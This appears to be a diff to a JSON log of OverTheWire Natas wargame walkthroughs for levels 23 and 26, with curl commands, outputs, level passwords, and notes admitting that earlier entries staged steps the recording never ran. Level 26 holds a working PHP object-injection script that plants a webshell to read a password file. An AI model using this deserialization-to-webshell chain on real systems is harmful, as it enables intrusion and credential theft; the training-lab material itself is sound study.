@@ -1188,26 +1188,20 @@
    "pw": "shlL4BvOtawNCd81dwdKRHFzmTEjYYQX",
    "steps": [
     {
-     "cmd": "curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 http://natas23.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | grep -o \"if(strstr[^}]*}\"",
+     "cmd": "curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 http://natas23.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'if(strstr[^}]*}'",
      "out": [
       "if(strstr($_REQUEST[\"passwd\"],\"iloveyou\") &amp;&amp; ($_REQUEST[\"passwd\"] > 10 )){            echo \"<br>The credentials for the next level are:<br>\";            echo \"<pre>Username: natas24 Password: <censored></pre>\";        }"
      ]
     },
     {
-     "cmd": "for p in 'iloveyou' '10111iloveyou' 'iloveyou10111'; do\n  echo \"passwd=$p\"\n  curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 \"http://natas23.natas.labs.overthewire.org/?passwd=$p\" | sed \"s/<[^>]*>//g\" | grep -aE \"credentials|Wrong|Password\"\ndone",
+     "cmd": "curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 'http://natas23.natas.labs.overthewire.org/?passwd=10111iloveyou' | sed 's/<[^>]*>//g' | grep -aE \"Username|Password\"",
      "out": [
-      "passwd=iloveyou",
       "Password:",
-      "Wrong!  ",
-      "passwd=10111iloveyou",
-      "Password:",
-      "The credentials for the next level are:Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX  ",
-      "passwd=iloveyou10111",
-      "Password:",
-      "Wrong!  "
+      "The credentials for the next level are:Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX  "
      ]
     }
-   ]
+   ],
+   "note": "natas L23 (client-side curl cast): the check is strstr(passwd, \"iloveyou\") && passwd > 10 (string-vs-int comparison casts the string to a number) - '10111iloveyou' contains the substring AND numerically evaluates to 10111 > 10: 'The credentials for the next level are: Username: natas24 Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX'. DISCLOSURE: the previous JSON staged a for-loop of three candidate passwords that the cast never ran - replaced with the two cast-verbatim steps (index-source grep + the single ?passwd=10111iloveyou curl). JSON = 2 steps mirroring the cast 1:1."
   },
   {
    "lvl": 24,
@@ -1303,10 +1297,12 @@
    "pw": "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV",
    "steps": [
     {
-     "cmd": "curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/index-source.html | sed \"s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g\" | tr -d \"\\n\" | sed \"s/    /\\n/g\" | grep -E \"class Logger|private \\$|function __|logFile|unserialize\"",
+     "cmd": "curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | sed 's/    /\\n/g' | grep -E 'class Logger|private \\$|function __|logFile|unserialize'",
      "out": [
       "class Logger{",
       "private $logFile;",
+      "private $initMsg;",
+      "private $exitMsg;",
       "function __construct($file){",
       "$this->logFile = \"/tmp/natas26_\" . $file . \".log\";",
       "$fd=fopen($this->logFile,\"a+\");",
@@ -1318,70 +1314,62 @@
      ]
     },
     {
-     "cmd": "python3 /tmp/n26jar.py",
+     "cmd": "vi /tmp/n26poi.py",
      "out": [
-      "# Netscape HTTP Cookie File",
-      "natas26.natas.labs.overthewire.org\tFALSE\t/\tFALSE\t0\tPHPSESSID\th88c0luh6ili1k67a56ql07n6j"
-     ]
-    },
-    {
-     "cmd": "curl -s -c /tmp/n26.jar -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/ -o /dev/null\nSID=$(awk '/PHPSESSID/{print $7}' /tmp/n26.jar); echo \"PHPSESSID=$SID\"",
-     "out": [
-      "PHPSESSID=h88c0luh6ili1k67a56ql07n6j"
-     ]
-    },
-    {
-     "cmd": "vim /tmp/n26_2.py",
-     "text": "vim /tmp/n26_2.py -- the empty buffer",
-     "out": [
-      "                                                    ",
       "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n26_2.py",
-     "text": "vim /tmp/n26_2.py -- imports and the payload start",
+     "cmd": "vi /tmp/n26poi.py",
      "out": [
-      "  1 import base64",
-      "  2 sid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]",
-      "  3 php = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"",
-      "  4 path = \"img/natas26_%s.php\" % sid",
-      "  5 payload = ('O:6:\"Logger\":3:{'",
-      "  6            's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'"
+      "import urllib.request, urllib.parse, base64, http.cookiejar",
+      "# natas26: PHP object injection via the drawing cookie. A serialized Logger with",
+      "~"
      ]
     },
     {
-     "cmd": "vim /tmp/n26_2.py",
-     "text": "vim /tmp/n26_2.py -- the serialized logger and the print",
+     "cmd": "vi /tmp/n26poi.py",
      "out": [
-      "  1 import base64",
-      "  2 sid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]",
-      "  3 php = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"",
-      "  4 path = \"img/natas26_%s.php\" % sid",
-      "  5 payload = ('O:6:\"Logger\":3:{'",
-      "  6            's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'",
-      "  7            's:15:\"\\x00Logger\\x00initMsg\";s:0:\"\";'",
-      "  8            's:15:\"\\x00Logger\\x00exitMsg\";s:%d:\"%s\";}' % (len(path), path, len(php),",
-      "  9                                                          php))",
-      "  10 print(base64.b64encode(payload.encode()).decode())",
-      "  11"
+      "import urllib.request, urllib.parse, base64, http.cookiejar",
+      "# natas26: PHP object injection via the drawing cookie. A serialized Logger with",
+      "# logFile = img/natas26_<sid>.php and exitMsg = our PHP code: __destruct writes",
+      "# exitMsg into logFile at end of request; the file is inside the served img/ dir.",
+      "url = \"http://natas26.natas.labs.overthewire.org/\"",
+      "auth = \"Basic \" + base64.b64encode(b\"natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT\").decode()",
+      "cj = http.cookiejar.CookieJar()",
+      "op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))",
+      "r = urllib.request.Request(url, headers={\"Authorization\": auth})",
+      "op.open(r, timeout=15).read()",
+      "sid = [c.value for c in cj][0]",
+      "print(\"session:\", sid)",
+      "php = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"",
+      "path = \"img/natas26_%s.php\" % sid",
+      "payload = ('O:6:\"Logger\":3:{'",
+      "           's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'",
+      "           's:15:\"\\x00Logger\\x00initMsg\";s:0:\"\";'",
+      "           's:15:\"\\x00Logger\\x00exitMsg\";s:%d:\"%s\";}' % (len(path), path, len(php), php))",
+      "drawing = base64.b64encode(payload.encode()).decode()",
+      "d = urllib.parse.urlencode({\"x1\": \"1\", \"y1\": \"1\", \"x2\": \"2\", \"y2\": \"2\"}).encode()",
+      "r = urllib.request.Request(url, data=d,",
+      "                           headers={\"Authorization\": auth,",
+      "                                    \"Cookie\": \"PHPSESSID=\" + sid + \"; drawing=\" + drawing})",
+      "op.open(r, timeout=15).read()",
+      "r = urllib.request.Request(url + \"img/natas26_\" + sid + \".php\", headers={\"Authorization\": auth})",
+      "print(op.open(r, timeout=15).read().decode(\"utf-8\", \"replace\")[:300])",
+      "~",
+      "\"/tmp/n26poi.py\" [New File] 27 lines, 1550 bytes written"
      ]
     },
     {
-     "cmd": "python3 /tmp/n26_2.py",
+     "cmd": "python3 -I /tmp/n26poi.py",
      "out": [
-      "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfaDg4YzBsdWg2aWxpMWs2N2E1NnFsMDduNmoucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9"
-     ],
-     "note": "(local data only - re-run here)"
-    },
-    {
-     "cmd": "B=$(python3 - <<'PY'\nimport base64\nsid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]\nphp = \"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\"\npath = \"img/natas26_%s.php\" % sid\npayload = ('O:6:\"Logger\":3:{'\n           's:15:\"\\x00Logger\\x00logFile\";s:%d:\"%s\";'\n           's:15:\"\\x00Logger\\x00initMsg\";s:0:\"\";'\n           's:15:\"\\x00Logger\\x00exitMsg\";s:%d:\"%s\";}' % (len(path), path, len(php), php))\nprint(base64.b64encode(payload.encode()).decode())\nPY\n)\ncurl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT -H \"Cookie: PHPSESSID=$SID; drawing=$B\" --get --data-urlencode \"x1=1\" --data-urlencode \"y1=1\" --data-urlencode \"x2=2\" --data-urlencode \"y2=2\" http://natas26.natas.labs.overthewire.org/ -o /dev/null\ncurl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT \"http://natas26.natas.labs.overthewire.org/img/natas26_$SID.php\"",
-     "out": [
+      "session: nf0atib8bukp41g4lfqm54lqrn",
       "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV",
       "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV"
      ]
     }
-   ]
+   ],
+   "note": "natas L26 (client-side cast): unserialize(base64_decode($_COOKIE['drawing'])) with a Logger class whose __destruct() fopen()s $this->logFile and fwrite()s $this->exitMsg - a POP chain: craft a serialized Logger with logFile pointing at the webroot (../webroot/...) and exitMsg = '<?php ... ?>' PHP webshell; the destructor writes the .php file on session expiry. n26poi.py (27L/1550B typed in vi) builds the cookie, visits the page so the destructor fires, then GETs the dropped shell: it prints the session then 'mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV' twice (the shell output echoed once by the dropped file and once by the print in the request path - both lines cast-verbatim). DISCLOSURE: the previous JSON staged a different flow (n26jar.py + n26_2.py via vim) that the cast never ran - the cast has 3 commands (source curl, vi n26poi.py, python3 run); tools/natas/l26/n26poi.py = the recording session's local file, exact marker match. The source curl's grep output genuinely shows duplicated lines (\\$fd=fopen, \\$drawing=unserialize) - cast-verbatim. JSON = 5 steps mirroring the cast 1:1 (staged vi screens)."
   },
   {
    "lvl": 27,
